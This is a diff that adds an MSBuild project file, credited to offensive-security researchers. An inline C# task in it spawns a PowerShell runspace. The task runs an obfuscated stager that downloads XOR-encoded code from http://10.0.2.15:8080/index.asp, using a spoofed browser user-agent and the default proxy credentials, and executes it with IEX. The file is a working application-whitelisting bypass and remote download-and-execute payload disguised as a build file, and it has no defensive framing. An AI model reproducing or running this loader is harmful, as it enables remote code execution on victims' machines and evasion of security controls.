@@ -1,0 +1,43 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+ <!-- Based on Casey Smith work (https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371), Twitter: @subTee  -->
+  <Target Name="34rfas">
+   <QWEridxnaPO />
+  </Target>
+	<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class QWEridxnaPO :  Task, ITask {
+				public override bool Execute() {
+					string pok = "$WC=NeW-OBJecT SyStem.NET.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAders.ADd('User-Agent',$u);$Wc.ProxY = [SYsTem.NET.WEBREQUesT]::DEFAuLtWebPRoxy;$WC.PROxY.CrEdentIalS = [SYSteM.Net.CreDentialCACHe]::DEFAulTNETWOrkCrEdEnTialS;$K='daf00538a3dfee3f25671a3f9d076377';$i=0;[Char[]]$B=([char[]]($Wc.DownLoADSTriNG('http://10.0.2.15:8080/index.asp')))|%{$_-bXoR$K[$I++%$K.LENGTH]};IEX ($b-joiN'')";
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(pok);
+					pipeline.Invoke();
+					runspace.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
